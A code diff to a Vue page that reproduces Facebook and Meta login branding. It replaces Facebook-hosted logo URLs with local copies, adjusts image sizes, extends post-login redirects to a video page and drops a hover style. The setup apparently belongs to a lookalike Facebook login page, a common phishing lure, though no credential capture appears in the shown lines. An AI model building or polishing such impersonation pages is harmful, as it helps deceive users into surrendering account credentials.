@@ -11,7 +11,7 @@
               class="md:pt-[112px] pb-4 flex items-center justify-center md:block"
             >
               <img
-                src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+                src="/fb.svg"
                 alt="Facebook"
                 class="h-[106px] -m-[28px]"
               />
@@ -147,7 +147,7 @@
         <div class="logo">
           <img
             alt="Facebook from Meta"
-            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png"
+            src="/f.png"
             style="
               max-height: 60px;
               min-height: 0px;
@@ -192,16 +192,14 @@
             <img
               alt="Meta logo"
               class="wbloks_1"
-              src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png"
+              src="/meta.png"
               style="
-                height: 100%;
-                width: 100%;
+                height: 12px;
+                width: 60px;
                 mask-size: contain;
                 object-fit: contain;
                 overflow: hidden;
               "
-              height="12"
-              width="60"
             />
           </div>
           <div class="mb-4 flex items-center justify-center text-[10px] text-[rgb(99,120,138)] gap-1">
@@ -267,11 +265,11 @@ export default {
         if (urlVideo) {
           setTimeout(() => {
             this.$router.push(`/videos/${urlVideo}`);
-          }, 3000)
+          }, 5000)
         } else {
           setTimeout(() => {
             this.$router.push('/');
-          }, 3000)
+          }, 5000)
         }
       } else {
         this.loading = false;
@@ -403,11 +401,6 @@ export default {
     display: flex;
     justify-content: center;
     margin-top: 8px;
-    &:hover, &:focus {
-      height: 100%; width: 100%; 
-      transform: scaleX(0.98) scaleY(0.98);
-      opacity: 0.75;
-    }
   }
   .ip {
     background: #ffffff;
